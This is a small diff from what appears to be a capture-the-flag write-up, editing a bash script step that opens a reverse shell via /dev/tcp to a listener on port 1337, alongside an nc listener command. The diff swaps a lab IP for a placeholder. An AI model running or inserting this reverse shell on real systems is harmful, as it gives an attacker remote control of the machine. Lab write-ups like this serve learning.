@@ -104,7 +104,7 @@ I modified the script to get a reverse shell:
 ```
 #!/bin/bash
 
-/bin/bash -i >& /dev/tcp/10.9.1.194/1337 0>&1
+/bin/bash -i >& /dev/tcp/MY-IP/1337 0>&1
 ```
 
 I put a listener on port 1337: `nc -nlvp 1337`
